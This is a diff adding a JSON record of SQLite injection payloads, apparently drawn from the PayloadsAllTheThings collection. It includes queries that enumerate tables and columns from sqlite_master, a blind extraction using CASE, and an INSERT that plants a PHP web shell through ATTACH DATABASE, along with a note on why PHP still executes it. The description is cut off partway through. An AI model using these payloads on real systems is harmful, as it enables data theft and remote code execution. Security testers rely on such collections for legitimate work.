@@ -1,0 +1,23 @@
+{
+  "id": "rce-daec8c49cade",
+  "category": "RCE",
+  "title": "SQLite Injection",
+  "description": "# SQLite Injection\n\n> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or \"inject\" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.\n\n## Summary\n\n* [SQLi",
+  "payloads": [
+    "| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |",
+    "| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |",
+    "| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |",
+    "| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |",
+    "| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |",
+    "| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |",
+    "INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET[\"cmd\"]); ?>');--",
+    "**Note:** Using `ATTACH DATABASE` to create a file comes with a drawback: SQLite will prepend its magic header bytes (`5351 4c69 7465 2066 6f72 6d61 7420 3300`, i.e., *\"SQLite format 3\"*). These bytes will corrupt most server-side scripts, but PHP is unusually tolerant: as long as a `<?php` tag appears anywhere in the file, the interpreter ignores any preceding garbage and executes the embedded code.",
+    "* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)",
+    "* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)",
+    "* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://web.archive.org/web/20131208191957/https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/SQL Injection/SQLite Injection.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
